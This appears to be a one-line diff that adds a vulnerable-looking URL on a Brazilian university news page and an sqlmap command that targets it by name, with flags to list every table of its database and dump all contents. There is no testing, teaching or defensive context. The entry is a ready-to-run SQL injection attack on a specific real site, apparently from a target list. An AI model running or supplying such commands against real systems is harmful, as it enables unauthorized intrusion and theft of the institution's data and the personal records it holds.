@@ -1,0 +1,1 @@
+http://www.rge.fmrp.usp.br/mostra_noticia.php?id=340 (GET)  # sqlmap.py -u http://www.rge.fmrp.usp.br/mostra_noticia.php?id=340 -D rge --tables --dump-all --threads=5 -v3
